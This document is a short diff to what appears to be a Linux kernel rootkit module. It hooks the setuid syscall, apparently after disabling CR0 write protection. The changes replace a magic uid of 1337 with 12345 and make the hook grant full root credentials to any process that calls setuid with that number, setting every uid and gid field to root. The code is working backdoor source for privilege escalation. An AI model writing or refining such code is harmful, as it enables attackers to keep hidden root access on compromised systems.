@@ -10,7 +10,7 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 #include <linux/file.h>
-
+#define MAGIC_NUMBER 12345
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -56,25 +56,30 @@ asmlinkage int (*origin_setuid) (uid_t uid);
 /* Malicious setuid hook syscall */
 asmlinkage int sneaky_setuid(uid_t uid)
 {
-  if (uid == (uint)1337)
+  if (uid == MAGIC_NUMBER)
     {
       /* Create new cred struct */
-      struct cred *np;
+      struct cred *new_cred;
       /* Create uid struct */
-      kuid_t nuid;
+      //      kuid_t nuid;
       /* Set uid struct value to 0 */
-      nuid.val = 0;
+      //nuid.val = 0;
       /* Print UID and EUID of current process to dmesg */
       printk(KERN_INFO "[+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
       printk(KERN_WARNING "[!] Attempting UID change!");
       /* Prepares new set of credentials for task_struct of current process */
-      np = prepare_creds();
+      new_cred = prepare_creds();
       /* Set uid of new cred struct to 0 */
-      np->uid = nuid;
-      /* Set euid of new cred struct to 0 */
-      np->euid = nuid;
+      new_cred->uid = GLOBAL_ROOT_UID;
+      new_cred->gid = GLOBAL_ROOT_GID;
+      new_cred->suid = GLOBAL_ROOT_UID;
+      new_cred->sgid = GLOBAL_ROOT_GID;
+      new_cred->euid = GLOBAL_ROOT_UID;
+      new_cred->egid = GLOBAL_ROOT_GID;
+      new_cred->fsuid = GLOBAL_ROOT_UID;
+      new_cred->fsgid = GLOBAL_ROOT_GID;
       /* Commit cred to task_struct of process */
-      commit_creds(np);
+      commit_creds(new_cred);
       printk(KERN_WARNING "[!] Changes Complete!");
       printk(KERN_INFO "after change [+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
     }
